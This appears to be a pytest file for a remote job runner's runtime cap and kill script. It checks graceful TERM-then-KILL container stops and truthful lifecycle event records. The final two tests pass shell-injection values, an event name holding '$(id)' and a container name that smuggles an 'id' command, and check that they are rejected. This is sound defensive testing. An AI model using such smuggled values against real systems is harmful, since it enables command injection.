    assert [e["event"] for e in remote.events] == ["killed_by_runtime_cap"]


def test_the_cap_still_docker_kills_when_there_is_no_run_to_scope_to():
    """Without a run context there is no meta dir to read, no run id to scan
    for, and no events file to append to -- but the container name is still in
    hand, and a paid container must not be left running."""
    remote = _CapRemote()

    with mock.patch.object(ssh_common.subprocess, "run", remote.run):
        with pytest.raises(RuntimeError):
            ssh_common.raise_for_runtime_cap("box", 60, container_name="runplz-train-abc123")

    assert remote.cleanup == "sudo docker kill runplz-train-abc123"


def test_the_cap_error_is_unchanged_by_a_failed_event_write():
    """The event is a remote record, not the local error. `_record_remote_event`
    warns rather than raising precisely so it cannot mask the cap."""
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )

    def explode(cmd, **kwargs):
        remote = cmd[-1] if isinstance(cmd, list) else str(cmd)
        if "events.ndjson" in remote:
            raise OSError("ssh died before the event landed")
        return mock.Mock(returncode=0, stdout="", stderr="")

    with mock.patch.object(ssh_common.subprocess, "run", explode):
        with pytest.raises(RuntimeError, match="max_runtime_seconds=60"):
            ssh_common.raise_for_runtime_cap("box", 60, container_name=None, remote_run=remote_run)


def test_no_run_context_means_no_event_rather_than_an_unattributed_one():
    """Without a run there is no events file to append to, and an event with
    no run_id would be worse than none."""
    remote = _CapRemote()

    with mock.patch.object(ssh_common.subprocess, "run", remote.run):
        with pytest.raises(RuntimeError):
            ssh_common.raise_for_runtime_cap("box", 60, container_name=None)
    assert remote.events == []


# -- the cap and the watchdog stop a container gracefully (#158) -----------
#
# `raise_for_runtime_cap` branched on shape, and the docker branch came first:
# a bare `docker kill`, which is an immediate SIGKILL. The other branch sends
# TERM and escalates only if the job does not go. So the mode that is the
# default for ssh/gcp/aws was the one that stopped least gracefully, on the
# exact path the cap exists for -- a wedged job whose partial output is the
# only evidence of what went wrong.


def test_a_container_is_asked_to_stop_before_it_is_killed(box):
    """The point of #158. TERM first, so the job can flush what it has."""
    box.fake_container("runplz-train-abc123", honours_term=True)
    fields = box.run_kill(container="runplz-train-abc123")

    assert box.signals_sent() == ["TERM"]
    assert fields["escalated"] == "0"
    assert fields["alive_after"] == "0"
    assert fields["container_state"] == "stopped"


def test_a_container_that_ignores_term_is_still_killed(box):
    """Graceful is not optional-to-comply-with: the cap is still a hard stop,
    it just is not an instant one."""
    box.fake_container("runplz-train-abc123", honours_term=False)
    fields = box.run_kill(container="runplz-train-abc123", timeout_s=1)

    assert box.signals_sent() == ["TERM", "KILL"]
    assert fields["escalated"] == "1"
    assert fields["alive_after"] == "0"


def test_the_caller_s_container_name_is_used_without_the_file(box):
    """In docker mode the container is the run's only handle -- its processes
    live in the container's PID namespace, so the marker scan finds none and
    no bootstrap.pid is written. The orchestrator holds the name in memory;
    depending on the file instead would trade a guarantee for tidiness."""
    box.fake_container("runplz-train-abc123")
    assert not (box.meta / ssh_common.CONTAINER_FILENAME).exists()

    fields = box.run_kill(container="runplz-train-abc123")
    assert fields["container"] == "runplz-train-abc123"
    assert box.signals_sent() == ["TERM"]


def test_the_container_file_is_still_read_when_the_caller_does_not_say(box):
    """`runplz kill` learns the name no other way."""
    box.fake_container("runplz-train-abc123")
    (box.meta / ssh_common.CONTAINER_FILENAME).write_text("runplz-train-abc123\n")

    fields = box.run_kill()
    assert fields["container"] == "runplz-train-abc123"
    assert box.signals_sent() == ["TERM"]


# -- the script no longer claims a user did it (#158) ---------------------
#
# `build_kill_command` appended `killed_by_user` whenever it signalled, and it
# is not only used by `runplz kill`: the runtime cap's native branch and the
# watchdog's terminate both used it, so a capped run and a stalled run each
# recorded that a person killed them. Nobody did. Unifying the cap onto this
# script without fixing that would have spread the false attribution to docker
# mode, next to the truthful `killed_by_runtime_cap` #155 had just added.


def test_the_script_records_nothing_when_the_caller_owns_the_event(box):
    box.spawn(RUN_ID)
    fields = box.run_kill(event=None)
    assert fields["signalled"] == "1"
    assert not (box.meta / "events.ndjson").exists()


def test_runplz_kill_still_records_killed_by_user(box):
    """The default is the CLI's, and it must not drift while the other callers
    opt out."""
    box.spawn(RUN_ID)
    box.run_kill()
    event = json.loads((box.meta / "events.ndjson").read_text().strip())
    assert event["event"] == "killed_by_user"


def test_a_lifecycle_event_name_cannot_break_out_of_the_shell():
    with pytest.raises(ValueError, match="lifecycle event name"):
        ssh_common.build_kill_command("$HOME/m", event='x","cmd":"$(id)')


def test_a_container_name_cannot_break_out_of_the_shell():
    with pytest.raises(ValueError, match="container name"):
        ssh_common.build_kill_command("$HOME/m", container='c"; id; :"')
